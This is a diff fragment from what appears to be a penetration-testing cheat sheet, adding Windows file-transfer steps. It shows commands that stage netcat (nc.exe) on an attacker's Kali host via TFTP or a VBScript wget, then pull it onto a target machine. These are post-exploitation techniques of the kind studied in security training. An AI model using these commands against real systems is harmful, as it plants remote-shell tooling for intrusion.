@@ -282,10 +282,18 @@ Net Use:
 
 Windows file transfer methods:
 ```vbs
-# Copy/paste into Windows shell: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
-# Run:
+# Run: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
 $ cscript wget.vbs http://10.11.0.42/nc.exe
+
+# tftp: set up tftp folder in Kali box
+$ mkdir /tftp
+$ atftpd --daemon --port 69 /tftp
+$ cp /usr/share/windows-binaries/nc.exe /tftp/
+# tftp: download nc.exe to target machine
+cmd> tftp -i 10.11.0.63 get nc.exe
+cmd> "Transfer successful: 59392 bytes in 31 seconds."
 ```
+
 Vulnerable services:
 ```powershell
 # Vulnerable services
